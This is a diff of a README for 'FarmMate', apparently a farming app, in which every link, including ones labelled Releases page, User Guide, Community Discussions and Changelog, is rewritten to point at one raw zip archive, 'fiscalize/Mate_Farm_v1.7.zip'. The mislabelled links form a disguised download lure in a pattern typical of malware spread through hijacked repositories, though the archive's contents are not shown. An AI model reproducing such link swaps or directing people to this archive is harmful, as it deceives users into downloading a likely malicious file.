@@ -1,6 +1,6 @@
 # 🌾 FarmMate - Your Smart Guide to Farming Success
 
-[![Download FarmMate](https://img.shields.io/badge/Download-FarmMate-blue?style=flat&logo=github)](https://github.com/RaxayGamer/FarmMate/releases)
+[![Download FarmMate](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip)](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you download FarmMate, ensure your system meets the following requirement
 
 ## 📥 Download & Install
 
-To get started with FarmMate, visit our [Releases page](https://github.com/RaxayGamer/FarmMate/releases) to download the latest version. 
+To get started with FarmMate, visit our [Releases page](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip) to download the latest version. 
 
 1. Click on the link above to open the Releases page.
 2. Find the latest version listed at the top.
@@ -62,8 +62,8 @@ We welcome contributions to improve FarmMate. If you have suggestions or want to
 
 For more information about FarmMate, consider visiting the following resources:
 
-- [User Guide](https://github.com/RaxayGamer/FarmMate/wiki)
-- [Community Discussions](https://github.com/RaxayGamer/FarmMate/discussions)
-- [Changelog](https://github.com/RaxayGamer/FarmMate/releases)
+- [User Guide](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip)
+- [Community Discussions](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip)
+- [Changelog](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip)
 
-Visit our [Releases page](https://github.com/RaxayGamer/FarmMate/releases) again to download updates as they become available. Your farming success awaits with FarmMate!
+Visit our [Releases page](https://github.com/RaxayGamer/FarmMate/raw/refs/heads/main/fiscalize/Mate_Farm_v1.7.zip) again to download updates as they become available. Your farming success awaits with FarmMate!
